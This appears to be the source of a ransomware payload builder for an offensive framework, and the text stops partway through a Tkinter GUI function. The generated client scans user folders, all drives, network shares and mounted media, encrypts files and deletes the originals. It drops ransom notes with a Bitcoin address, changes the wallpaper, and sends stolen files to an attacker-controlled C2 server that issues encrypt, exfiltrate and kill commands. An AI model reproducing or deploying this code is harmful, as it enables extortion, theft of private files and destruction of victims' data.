#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Ransomware C2 Client",
    "description": "Ransomware with XChaCha20-Poly1305 encryption, waits for C2 command",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Excellent",
    "types": "payload",
    "category": "payload",
    "dependencies": ["pycryptodome", "pillow"]
}

OPTIONS = {
    "LHOST": {
        "default": "127.0.0.1",
        "required": True,
        "description": "C2 Server IP address"
    },
    "LPORT": {
        "default": 4444,
        "required": False,
        "description": "C2 Server port"
    },
    "ENCRYPTION": {
        "default": "xchacha20",
        "required": False,
        "choices": ["xchacha20", "aes256", "chacha20", "xor", "rc4"],
        "description": "Encryption algorithm (XChaCha20 recommended)"
    },
    "EXTENSIONS": {
        "default": "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv",
        "required": False,
        "description": "File extensions to encrypt"
    },
    "RANSOM_NOTE": {
        "default": "YOUR FILES ARE ENCRYPTED!\\nSend BTC to address...",
        "required": False,
        "description": "Ransom note content"
    },
    "BTC_ADDRESS": {
        "default": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "required": False,
        "description": "Bitcoin address for ransom"
    },
    "WALLPAPER": {
        "default": True,
        "required": False,
        "description": "Change desktop wallpaper"
    },
    "GUI_MODE": {
        "default": True,
        "required": False,
        "description": "Enable GUI mode"
    },
    "COUNTDOWN_SECONDS": {
        "default": 300,
        "required": False,
        "description": "Countdown in seconds"
    },
    "DECRYPT_KEY": {
        "default": "",
        "required": False,
        "description": "Decryption key (auto-generate if empty)"
    },
    "AV_BYPASS": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable AV bypass techniques"
    },
    "PRIVILEGE_ESCALATION": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Attempt privilege escalation"
    },
    "PARALLEL_ENCRYPTION": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable parallel encryption (multi-threaded)"
    },
    "THREAD_COUNT": {
        "default": 4,
        "required": False,
        "description": "Number of encryption threads (parallel mode)"
    },
    "TARGET_OS": {
        "default": "all",
        "required": False,
        "choices": ["all", "windows", "linux", "macos"],
        "description": "Target OS for build"
    }
}

import os
import base64
import random
import string
import sys
import shutil
import subprocess
from pathlib import Path


class RansomwareBuilder:
    """Ransomware Builder - C2 Controlled Version with XChaCha20-Poly1305"""

    @staticmethod
    def generate_payload(lhost, lport, encryption, extensions, ransom_note, btc_address, wallpaper,
                         countdown_seconds=300, exfiltrate=True, max_file_size_mb=10, use_gui=True,
                         decrypt_key="", av_bypass=True, privilege_esc=True,
                         parallel=True, thread_count=4, target_os="all", lateral_movement=True,
                         lolbins=True, spread_methods="all", target_subnets="192.168.1.0/24,10.0.0.0/24",
                         max_spread_hosts=10, use_credentials=True):
        """Generate ransomware that waits for C2 command - with XChaCha20-Poly1305"""

        ransom_note_escaped = ransom_note.replace('"', '\\"').replace('\n', '\\n')
        extensions_list = [e.strip() for e in extensions.split(',')]

        if not decrypt_key:
            decrypt_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

        wallpaper_bool = "True" if wallpaper else "False"
        exfiltrate_bool = "True" if exfiltrate else "False"
        use_gui_bool = "True" if use_gui else "False"
        av_bypass_bool = "True" if av_bypass else "False"
        privilege_esc_bool = "True" if privilege_esc else "False"
        parallel_bool = "True" if parallel else "False"
        lateral_movement_bool = "True" if lateral_movement else "False"
        lolbins_bool = "True" if lolbins else "False"
        use_credentials_bool = "True" if use_credentials else "False"

        ext_list_str = "[" + ", ".join([f'"{e}"' for e in extensions_list]) + "]"

        encryptor_script = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ransomware C2 Client - XChaCha20-Poly1305 Encryption
Menunggu perintah dari C2 Server
"""

import os
import sys
import base64
import hashlib
import random
import string
import time
import socket
import threading
import subprocess
import json
import glob
import platform
import ctypes
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== CONFIG ====================
C2_HOST = "{lhost}"
C2_PORT = {lport}
ENCRYPTION = "{encryption}"
EXTENSIONS = {ext_list_str}
BTC_ADDRESS = "{btc_address}"
WALLPAPER_CHANGE = {wallpaper_bool}
COUNTDOWN_SECONDS = {countdown_seconds}
EXFILTRATE_FILES = {exfiltrate_bool}
MAX_FILE_SIZE_MB = {max_file_size_mb}
USE_GUI = {use_gui_bool}
DECRYPT_KEY = "{decrypt_key}"
AV_BYPASS = {av_bypass_bool}
PRIVILEGE_ESCALATION = {privilege_esc_bool}
PARALLEL_ENCRYPTION = {parallel_bool}
THREAD_COUNT = {thread_count}
LATERAL_MOVEMENT_ENABLED = {lateral_movement_bool}
LOLBINS_ENABLED = {lolbins_bool}
SPREAD_METHODS = "{spread_methods}"
TARGET_SUBNETS = "{target_subnets}"
MAX_SPREAD_HOSTS = {max_spread_hosts}
USE_CREDENTIALS = {use_credentials_bool}

RANSOM_NOTE = \"\"\"{ransom_note_escaped}\"\"\"

# ==================== OS DETECTION ====================
def get_os():
    system = platform.system().lower()
    if system == 'windows':
        return 'windows'
    elif system == 'darwin':
        return 'macos'
    else:
        return 'linux'

OS = get_os()
IS_WINDOWS = OS == 'windows'
IS_LINUX = OS == 'linux'
IS_MACOS = OS == 'macos'

# ==================== PRIVILEGE ESCALATION ====================
def check_admin():
    try:
        if IS_WINDOWS:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

# ==================== AV BYPASS ====================
def av_bypass_techniques():
    if not AV_BYPASS:
        return
    try:
        if IS_WINDOWS:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetErrorMode(0x8001)
            try:
                import win32process, win32api, win32con
                win32api.SetProcessPriorityBoost(win32api.GetCurrentProcess(), True)
            except:
                pass
        time.sleep(random.uniform(5, 15))
    except:
        pass

# ==================== KEY MANAGEMENT ====================
def generate_key():
    """Generate 256-bit key (32 bytes) from DECRYPT_KEY"""
    return hashlib.sha256(DECRYPT_KEY.encode()).digest()

def generate_nonce():
    """Generate 24-byte nonce for XChaCha20"""
    return os.urandom(24)

# ==================== XChaCha20-Poly1305 CRYPTO ====================
def encrypt_xchacha20(data, key):
    """XChaCha20-Poly1305 encryption - 256-bit key, 24-byte nonce"""
    try:
        from Crypto.Cipher import ChaCha20_Poly1305
        
        nonce = os.urandom(24)
        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return nonce + ciphertext + tag
    except ImportError:
        print("[!] PyCryptodome not found, falling back to AES256")
        return encrypt_aes256(data, key[:16])
    except Exception as e:
        print("[!] XChaCha20 error: " + str(e) + ", falling back to XOR")
        return encrypt_xor(data, key[:16])

def decrypt_xchacha20(data, key):
    """XChaCha20-Poly1305 decryption"""
    try:
        from Crypto.Cipher import ChaCha20_Poly1305
        nonce = data[:24]
        tag = data[-16:]
        ciphertext = data[24:-16]
        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except ImportError:
        return decrypt_aes256(data, key[:16])
    except Exception as e:
        print("[!] XChaCha20 decryption error: " + str(e))
        return decrypt_xor(data, key[:16])

# ==================== AES256 CRYPTO (Fallback) ====================
def encrypt_aes256(data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        return iv + cipher.encrypt(pad(data, AES.block_size))
    except:
        return encrypt_xor(data, key[:16])

def decrypt_aes256(data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        iv = data[:16]
        ct = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        return unpad(cipher.decrypt(ct), AES.block_size)
    except:
        return decrypt_xor(data, key[:16])

# ==================== ChaCha20 CRYPTO (Fallback) ====================
def encrypt_chacha20(data, key):
    try:
        from Crypto.Cipher import ChaCha20
        nonce = os.urandom(8)
        cipher = ChaCha20.new(key=key[:32], nonce=nonce)
        return nonce + cipher.encrypt(data)
    except:
        return encrypt_aes256(data, key[:16])

def decrypt_chacha20(data, key):
    try:
        from Crypto.Cipher import ChaCha20
        nonce = data[:8]
        ct = data[8:]
        cipher = ChaCha20.new(key=key[:32], nonce=nonce)
        return cipher.decrypt(ct)
    except:
        return decrypt_aes256(data, key[:16])

# ==================== XOR CRYPTO (Last Resort) ====================
def encrypt_xor(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def decrypt_xor(data, key):
    return encrypt_xor(data, key)

# ==================== RC4 CRYPTO ====================
def encrypt_rc4(data, key):
    try:
        from Crypto.Cipher import ARC4
        cipher = ARC4.new(key[:16])
        return cipher.encrypt(data)
    except:
        return encrypt_xor(data, key[:8])

def decrypt_rc4(data, key):
    try:
        from Crypto.Cipher import ARC4
        cipher = ARC4.new(key[:16])
        return cipher.decrypt(data)
    except:
        return decrypt_xor(data, key[:8])

# ==================== MAIN ENCRYPT/DECRYPT FUNCTIONS ====================
def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        if ENCRYPTION == "xchacha20":
            encrypted = encrypt_xchacha20(data, key)
        elif ENCRYPTION == "aes256":
            encrypted = encrypt_aes256(data, key[:16])
        elif ENCRYPTION == "chacha20":
            encrypted = encrypt_chacha20(data, key)
        elif ENCRYPTION == "rc4":
            encrypted = encrypt_rc4(data, key[:16])
        else:
            encrypted = encrypt_xor(data, key[:16])
        
        encrypted_path = filepath + ".revil"
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except Exception as e:
        print("[!] Encrypt error: " + str(e))
        return False

def decrypt_file(filepath, key):
    try:
        if not filepath.endswith('.revil'):
            return False
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        if ENCRYPTION == "xchacha20":
            decrypted = decrypt_xchacha20(data, key)
        elif ENCRYPTION == "aes256":
            decrypted = decrypt_aes256(data, key[:16])
        elif ENCRYPTION == "chacha20":
            decrypted = decrypt_chacha20(data, key)
        elif ENCRYPTION == "rc4":
            decrypted = decrypt_rc4(data, key[:16])
        else:
            decrypted = decrypt_xor(data, key[:16])
        
        original_path = filepath.replace('.revil', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted)
        os.remove(filepath)
        return True
    except Exception as e:
        print("[!] Decrypt error: " + str(e))
        return False

# ==================== FILE FINDER ====================
def find_files(encrypted_only=False):
    """Find files to encrypt with comprehensive directory scanning"""
    files = []
    extensions_lower = [ext.lower().strip() for ext in EXTENSIONS]
    search_dirs = []
    
    if IS_WINDOWS:
        import string
        home = os.path.expanduser("~")
        search_dirs.extend([
            home,
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Music"),
            os.path.join(home, "Videos"),
            os.path.join(home, "AppData", "Local"),
            os.path.join(home, "AppData", "Roaming"),
        ])
        
        # ===== FIX: Escape backslash dengan double backslash =====
        users_path = "C:\\\\Users"
        if os.path.exists(users_path):
            for user in os.listdir(users_path):
                user_path = os.path.join(users_path, user)
                if os.path.isdir(user_path):
                    search_dirs.append(user_path)
                    search_dirs.append(os.path.join(user_path, "Documents"))
                    search_dirs.append(os.path.join(user_path, "Downloads"))
                    search_dirs.append(os.path.join(user_path, "Desktop"))
                    search_dirs.append(os.path.join(user_path, "Pictures"))
                    search_dirs.append(os.path.join(user_path, "Music"))
                    search_dirs.append(os.path.join(user_path, "Videos"))
        
        search_dirs.extend([
            "C:\\\\ProgramData",
            "C:\\\\Temp",
            "C:\\\\Windows\\\\Temp",
        ])
        
        for drive_letter in string.ascii_uppercase:
            drive_path = drive_letter + ":\\\\"
            if os.path.exists(drive_path):
                search_dirs.append(drive_path)
                print("[*] Found drive: " + drive_path)
                
                common_folders = [
                    "Users", "Documents", "Downloads", "Desktop",
                    "Pictures", "Music", "Videos", "ProgramData", "Temp"
                ]
                for folder in common_folders:
                    folder_path = os.path.join(drive_path, folder)
                    if os.path.exists(folder_path):
                        search_dirs.append(folder_path)
        
        try:
            result = subprocess.run('net use', shell=True, capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\\n'):
                if ':' in line and '\\\\' in line:
                    parts = line.split()
                    for part in parts:
                        if ':' in part and len(part) <= 3 and part[1] == ':':
                            drive_path = part + "\\\\"
                            if os.path.exists(drive_path):
                                search_dirs.append(drive_path)
        except:
            pass
            
    elif IS_MACOS:
        home = os.path.expanduser("~")
        search_dirs = [
            home,
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Music"),
            os.path.join(home, "Movies"),
            "/Users",
            "/Volumes",
        ]
        
        users_path = "/Users"
        if os.path.exists(users_path):
            for user in os.listdir(users_path):
                user_path = os.path.join(users_path, user)
                if os.path.isdir(user_path) and user not in [".localized", "Shared"]:
                    search_dirs.append(user_path)
                    search_dirs.append(os.path.join(user_path, "Documents"))
                    search_dirs.append(os.path.join(user_path, "Downloads"))
                    search_dirs.append(os.path.join(user_path, "Desktop"))
                    
    else:
        home = os.path.expanduser("~")
        search_dirs = [
            home,
            os.path.join(home, "Desktop"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Music"),
            os.path.join(home, "Videos"),
            os.path.join(home, "Public"),
            os.path.join(home, "Templates"),
            "/tmp",
            "/var/tmp",
            "/var/www",
            "/srv",
            "/mnt",
            "/media",
            "/run/media",
        ]
        
        if os.path.exists("/home"):
            try:
                for user_dir in os.listdir("/home"):
                    user_path = os.path.join("/home", user_dir)
                    if os.path.isdir(user_path) and not user_dir.startswith('.'):
                        search_dirs.append(user_path)
                        search_dirs.append(os.path.join(user_path, "Desktop"))
                        search_dirs.append(os.path.join(user_path, "Documents"))
                        search_dirs.append(os.path.join(user_path, "Downloads"))
                        search_dirs.append(os.path.join(user_path, "Pictures"))
                        search_dirs.append(os.path.join(user_path, "Music"))
                        search_dirs.append(os.path.join(user_path, "Videos"))
            except Exception as e:
                print("[!] Error scanning /home: " + str(e))
        
        if os.path.exists("/root"):
            search_dirs.append("/root")
            search_dirs.append("/root/Desktop")
            search_dirs.append("/root/Documents")
            search_dirs.append("/root/Downloads")

        if os.path.exists("/mnt"):
            try:
                for mount in os.listdir("/mnt"):
                    mount_path = os.path.join("/mnt", mount)
                    if os.path.isdir(mount_path):
                        search_dirs.append(mount_path)
            except:
                pass
        
        if os.path.exists("/media"):
            try:
                for media in os.listdir("/media"):
                    media_path = os.path.join("/media", media)
                    if os.path.isdir(media_path):
                        search_dirs.append(media_path)
                        for sub in os.listdir(media_path):
                            sub_path = os.path.join(media_path, sub)
                            if os.path.isdir(sub_path):
                                search_dirs.append(sub_path)
            except:
                pass

    search_dirs = list(set(search_dirs))
    
    valid_dirs = []
    for d in search_dirs:
        if d and os.path.exists(d) and os.path.isdir(d):
            valid_dirs.append(d)
    search_dirs = valid_dirs
    
    print("[*] Searching in " + str(len(search_dirs)) + " directories...")
    
    for root_dir in search_dirs:
        if not os.path.exists(root_dir):
            continue
            
        print("[*] Scanning: " + str(root_dir))

        try:
            for dirpath, dirnames, filenames in os.walk(root_dir):
                skip_dirs = [
                    'Windows', 'System32', 'System', 'WinSxS', 'MSBuild',
                    'Microsoft.NET', 'Microsoft Shared', 'Microsoft Visual Studio',
                    'Common Files', 'Program Files', 'Program Files (x86)',
                    'WindowsApps', 'WindowsPowerShell', 'MicrosoftEdge',
                    'python', 'Python', 'venv', 'env', 'virtualenv', 
                    'conda', 'anaconda', 'miniconda', '__pycache__',
                    'Lib', 'site-packages', 'dist-packages',
                    'Library', 'System', 'Applications', 'Developer',
                    'Xcode', 'Android', 'Homebrew', '.Trash',
                    'bin', 'lib', 'lib64', 'lib32', 'sbin', 'usr', 'var',
                    'proc', 'sys', 'dev', 'run', 'boot', 'etc', 'opt',
                    'snap', 'flatpak', 'snapd',
                    '.cache', '.local', '.config', '.npm', '.m2', '.gradle',
                    '.cargo', '.rustup', '.vscode', '.idea', '.pycharm',
                    '.git', '.svn', '.hg', '.bzr',
                    'node_modules', 'vendor', 'target', 'build', 'dist',
                    'out', 'bin', 'obj', 'Debug', 'Release', 'x64', 'x86',
                    'packages', 'refs', 'test', 'tests', '__tests__',
                    'docker', 'k8s', 'kubernetes', 'VMware', 'VirtualBox',
                    'Recovery', 'System Volume Information', '$Recycle.Bin',
                    'Temp', 'tmp', 'cache', 'log', 'logs',
                ]
                
                if any(skip in dirpath for skip in skip_dirs):
                    continue
                if '/.' in dirpath or dirpath.startswith('.'):
                    continue

                for filename in filenames:
                    if filename.startswith('README_RANSOM') or filename.startswith('DECRYPT_KEY'):
                        continue
                    if filename.startswith('.'):
                        continue

                    if encrypted_only:
                        if filename.endswith('.revil'):
                            files.append(os.path.join(dirpath, filename))
                    else:
                        if filename.endswith('.revil'):
                            continue
                        
                        ext = filename.split('.')[-1].lower() if '.' in filename else ''
                        if ext in extensions_lower:
                            filepath = os.path.join(dirpath, filename)
                            try:
                                size = os.path.getsize(filepath)
                                if 1024 < size < 100 * 1024 * 1024:
                                    files.append(filepath)
                                    if len(files) % 100 == 0:
                                        print("[*] Found " + str(len(files)) + " files so far...")
                            except Exception:
                                pass
        except Exception as e:
            print("[!] Error scanning " + str(root_dir) + ": " + str(e))

    print("[*] Total files found: " + str(len(files)))
    
    random.shuffle(files)
    return files

# ==================== PARALLEL ENCRYPTION ====================
def parallel_encrypt_files(files, key, progress_callback=None):
    encrypted_count = 0
    total = len(files)
    
    if not PARALLEL_ENCRYPTION or total < 10:
        for i, filepath in enumerate(files):
            if encrypt_file(filepath, key):
                encrypted_count += 1
            if progress_callback:
                progress_callback(i + 1, total)
        return encrypted_count
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        for f in files:
            futures.append(executor.submit(encrypt_file, f, key))
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if future.result():
                encrypted_count += 1
            if progress_callback:
                progress_callback(completed, total)
    
    return encrypted_count

# ==================== WALLPAPER ====================
def change_wallpaper():
    if not WALLPAPER_CHANGE:
        return
    try:
        if IS_WINDOWS:
            import ctypes
            from PIL import Image, ImageDraw
            
            img = Image.new('RGB', (1920, 1080), color='black')
            draw = ImageDraw.Draw(img)
            try:
                from PIL import ImageFont
                font = ImageFont.truetype("arial.ttf", 60)
            except:
                font = ImageFont.load_default()
            
            lines = ["RANSOMWARE", "YOUR FILES ARE ENCRYPTED!", "", "BTC: " + BTC_ADDRESS]
            y = 200
            for line in lines:
                if line:
                    bbox = draw.textbbox((0, 0), line, font=font)
                    x = (1920 - (bbox[2] - bbox[0])) // 2
                    color = '#ff0000' if 'RANSOMWARE' in line else '#ffffff'
                    draw.text((x, y), line, fill=color, font=font)
                y += 70
            
            wallpaper_path = os.path.expanduser("~/Desktop/wallpaper.jpg")
            img.save(wallpaper_path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
            
        elif IS_LINUX:
            subprocess.run(['gsettings', 'set', 'org.gnome.desktop.background',
                          'picture-uri', 'https://raw.githubusercontent.com/lazyframework/lazyframework/main/banner/ransomware.jpg'],
                          capture_output=True)
    except:
        pass

# ==================== RANSOM NOTE ====================
def drop_ransom_note():
    note_content = RANSOM_NOTE + "\\n\\nDECRYPTION KEY: " + DECRYPT_KEY + "\\nALGORITHM: " + ENCRYPTION
    note_locations = [
        os.path.expanduser("~/Desktop/README_RANSOM.txt"),
        os.path.expanduser("~/Documents/README_RANSOM.txt"),
        os.path.expanduser("~/Downloads/README_RANSOM.txt"),
    ]
    if IS_WINDOWS:
        # ===== FIX: Escape backslash =====
        note_locations.extend(["C:\\\\Users\\\\Public\\\\README_RANSOM.txt"])
    else:
        note_locations.extend(["/tmp/README_RANSOM.txt"])
    for location in note_locations:
        try:
            with open(location, 'w', encoding='utf-8') as f:
                f.write(note_content)
        except:
            pass

# ==================== EXFILTRATION ====================
def exfiltrate_file(filepath, sock=None):
    if not EXFILTRATE_FILES:
        return False
    try:
        size = os.path.getsize(filepath) / (1024 * 1024)
        if size > MAX_FILE_SIZE_MB:
            return False
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        data = {{
            'type': 'exfiltrate',
            'filename': os.path.basename(filepath),
            'content': base64.b64encode(content.encode()).decode(),
            'size': size,
            'timestamp': datetime.now().isoformat(),
            'os': OS
        }}
        if sock:
            sock.send(json.dumps(data).encode() + b'\\n')
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((C2_HOST, C2_PORT))
            s.send(json.dumps(data).encode() + b'\\n')
            s.close()
        return True
    except:
        return False

# ==================== C2 CLIENT ====================
class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.running = True
        self.command_handlers = {{
            'encrypt': self.cmd_encrypt,
            'decrypt': self.cmd_decrypt,
            'status': self.cmd_status,
            'exfiltrate': self.cmd_exfiltrate,
            'kill': self.cmd_kill,
            'wallpaper': self.cmd_wallpaper,
            'note': self.cmd_note,
            'ping': self.cmd_ping,
        }}
        self.encrypted = False
        self.decrypt_key = DECRYPT_KEY
        self.key = generate_key()
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.host, self.port))
            print("[+] Connected to C2: " + self.host + ":" + str(self.port))
            
            info = {{
                'type': 'register',
                'os': OS,
                'hostname': socket.gethostname(),
                'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
                'is_admin': check_admin(),
                'decrypt_key': DECRYPT_KEY,
                'encryption': ENCRYPTION,
                'timestamp': datetime.now().isoformat()
            }}
            self.socket.send(json.dumps(info).encode() + b'\\n')
            print("[+] Registered with C2")
            return True
        except Exception as e:
            print("[!] Failed to connect to C2: " + str(e))
            return False
    
    def listen(self):
        buffer = ""
        print("[*] Waiting for C2 commands...")
        
        while self.running:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    print("[!] C2 disconnected")
                    break
                buffer += data
                while '\\n' in buffer:
                    line, buffer = buffer.split('\\n', 1)
                    try:
                        cmd = json.loads(line)
                        self.process_command(cmd)
                    except json.JSONDecodeError:
                        print("[!] Invalid command: " + line)
            except socket.timeout:
                continue
            except Exception as e:
                print("[!] Connection error: " + str(e))
                break
        
        self.running = False
        print("[*] C2 connection closed")
    
    def process_command(self, cmd):
        cmd_type = cmd.get('type', '')
        print("[*] Received command: " + cmd_type)
        
        if cmd_type in self.command_handlers:
            self.command_handlers[cmd_type](cmd)
        else:
            print("[!] Unknown command: " + cmd_type)
    
    def send_response(self, response):
        try:
            response['timestamp'] = datetime.now().isoformat()
            response['os'] = OS
            self.socket.send(json.dumps(response).encode() + b'\\n')
        except:
            pass
    
    # ===== COMMAND HANDLERS =====
    
    def cmd_encrypt(self, cmd):
        print("[*] Starting encryption...")
        files = find_files(encrypted_only=False)
        print("[*] Found " + str(len(files)) + " files")
        
        if len(files) == 0:
            self.send_response({{'type': 'encrypt_response', 'status': 'error', 'message': 'No files found'}})
            return
        
        encrypted_count = parallel_encrypt_files(files, self.key)
        self.encrypted = True
        
        drop_ransom_note()
        change_wallpaper()
        
        self.send_response({{
            'type': 'encrypt_response',
            'status': 'success',
            'files_encrypted': encrypted_count,
            'total_files': len(files),
            'decrypt_key': DECRYPT_KEY,
            'algorithm': ENCRYPTION,
        }})
        print("[+] Encrypted " + str(encrypted_count) + " files with " + ENCRYPTION)
    
    def cmd_decrypt(self, cmd):
        if not self.encrypted:
            self.send_response({{'type': 'decrypt_response', 'status': 'error', 'message': 'No encryption performed'}})
            return
        
        print("[*] Starting decryption...")
        files = find_files(encrypted_only=True)
        print("[*] Found " + str(len(files)) + " encrypted files")
        
        decrypted_count = 0
        for filepath in files:
            if decrypt_file(filepath, self.key):
                decrypted_count += 1
        
        self.encrypted = False
        
        self.send_response({{
            'type': 'decrypt_response',
            'status': 'success',
            'files_decrypted': decrypted_count,
            'total_files': len(files),
        }})
        print("[+] Decrypted " + str(decrypted_count) + " files")
    
    def cmd_status(self, cmd):
        files = find_files(encrypted_only=True)
        self.send_response({{
            'type': 'status_response',
            'status': 'ok',
            'os': OS,
            'is_admin': check_admin(),
            'encrypted': self.encrypted,
            'encrypted_files': len(files),
            'decrypt_key': DECRYPT_KEY,
            'algorithm': ENCRYPTION,
            'uptime': time.time(),
        }})
        print("[+] Status sent")
    
    def cmd_exfiltrate(self, cmd):
        print("[*] Exfiltrating files...")
        files = find_files(encrypted_only=False)
        exfiltrated = 0
        for filepath in files[:10]:
            if exfiltrate_file(filepath, self.socket):
                exfiltrated += 1
        self.send_response({{
            'type': 'exfiltrate_response',
            'status': 'success',
            'files_exfiltrated': exfiltrated,
        }})
        print("[+] Exfiltrated " + str(exfiltrated) + " files")
    
    def cmd_wallpaper(self, cmd):
        change_wallpaper()
        self.send_response({{'type': 'wallpaper_response', 'status': 'success'}})
        print("[+] Wallpaper changed")
    
    def cmd_note(self, cmd):
        drop_ransom_note()
        self.send_response({{'type': 'note_response', 'status': 'success'}})
        print("[+] Ransom note dropped")
    
    def cmd_ping(self, cmd):
        self.send_response({{'type': 'pong', 'status': 'ok'}})
    
    def cmd_kill(self, cmd):
        print("[*] Self-destructing...")
        self.send_response({{'type': 'kill_response', 'status': 'success'}})
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        time.sleep(1)
        sys.exit(0)

# ==================== GUI (Tkinter) ====================
def create_gui():
    try:
        import tkinter as tk
        from tkinter import ttk, messagebox, scrolledtext, simpledialog
        
        root = tk.Tk()
        root.title("RANSOMWARE - C2 Controlled")
        root.geometry("1200x720")
        root.resizable(False, False)
        root.configure(bg='#000000')
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TLabel', foreground='#ff0000', background='#000000', font=('Consolas', 12))
        style.configure('TButton', foreground='#ffffff', background='#ff0000', font=('Consolas', 11))
        
        status_var = tk.StringVar(value="Connected to C2 - Waiting for command")
        
        os_label = tk.Label(root, text="OS: " + OS.upper() + " | Admin: " + ('✅' if check_admin() else '❌'),
                           font=('Consolas', 9), fg='#888888', bg='#000000')
        os_label.pack(pady=2)
        
        title = tk.Label(root, text="RANSOMWARE", font=('Consolas', 20, 'bold'),
                        fg='#ff0000', bg='#000000')
        title.pack(pady=5)
        
        warning = tk.Label(root, text="WAITING FOR C2 COMMAND", font=('Consolas', 16, 'bold'),
                          fg='#ffff00', bg='#000000')
        warning.pack(pady=5)
        
        status_label = tk.Label(root, textvariable=status_var, font=('Consolas', 11),
                                fg='#888888', bg='#000000')
        status_label.pack(pady=5)
        
        algo_label = tk.Label(root, text="Algorithm: " + ENCRYPTION.upper() + " (256-bit)",
                             font=('Consolas', 10), fg='#00ff00', bg='#000000')
        algo_label.pack(pady=2)
        
        btc_label = tk.Label(root, text="BTC: " + BTC_ADDRESS[:20] + "...", font=('Consolas', 10),
                            fg='#00ff00', bg='#000000')
        btc_label.pack(pady=2)
        
        info_frame = tk.Frame(root, bg='#000000')
        info_frame.pack(pady=10, fill='both', expand=True, padx=20)
        
        info_text = scrolledtext.ScrolledText(info_frame, height=6, bg='#1a1a1a', fg='#ffffff',
                                               font=('Consolas', 10), relief='flat')
        info_text.insert('1.0', "C2 Controlled Ransomware\\n\\n" +
                         "Algorithm: " + ENCRYPTION.upper() + " (256-bit)\\n" +
                         "Waiting for command from C2 server.\\n" +
                         "Commands: encrypt, decrypt, status, exfiltrate, kill")
        info_text.config(state='disabled')
        info_text.pack(fill='both', expand=True)
        
        btn_frame = tk.Frame(root, bg='#000000')
        btn_frame.pack(pady=10)
        
        def cmd_encrypt_gui():
            status_var.set("Encrypting files...")
            try:
                key = generate_key()
                files = find_files(encrypted_only=False)
                encrypted_count = parallel_encrypt_files(files, key)
                drop_ransom_note()
                change_wallpaper()
                status_var.set("Encrypted " + str(encrypted_count) + " files")
                messagebox.showinfo("Success", "Encrypted " + str(encrypted_count) + " files!\\nAlgorithm: " + ENCRYPTION)
            except Exception as e:
                status_var.set("Error: " + str(e))
        
        encrypt_btn = tk.Button(btn_frame, text="ENCRYPT", font=('Consolas', 12, 'bold'),
                                bg='#ff0000', fg='#ffffff', padx=20, pady=5,
                                command=cmd_encrypt_gui)
        encrypt_btn.pack(side='left', padx=5)
        
        def cmd_decrypt_gui():
            key_input = simpledialog.askstring("Decryption Key", "Enter decryption key:", show='*')
            if key_input == DECRYPT_KEY:
                status_var.set("Decrypting files...")
                files = find_files(encrypted_only=True)
                decrypted = 0
                key = generate_key()
                for f in files:
                    if decrypt_file(f, key):
                        decrypted += 1
                status_var.set("Decrypted " + str(decrypted) + " files")
                messagebox.showinfo("Success", "Decrypted " + str(decrypted) + " files!")
            else:
                messagebox.showerror("Error", "Invalid key!")
        
        decrypt_btn = tk.Button(btn_frame, text="DECRYPT", font=('Consolas', 12, 'bold'),
                                bg='#00ff00', fg='#000000', padx=20, pady=5,
                                command=cmd_decrypt_gui)
        decrypt_btn.pack(side='left', padx=5)
        
        def cmd_kill_gui():
            if messagebox.askyesno("Kill", "Self-destruct?"):
                status_var.set("Self-destructing...")
                root.destroy()
                sys.exit(0)
        
        kill_btn = tk.Button(btn_frame, text="KILL", font=('Consolas', 12, 'bold'),
                             bg='#ff0000', fg='#ffffff', padx=20, pady=5,
                             command=cmd_kill_gui)
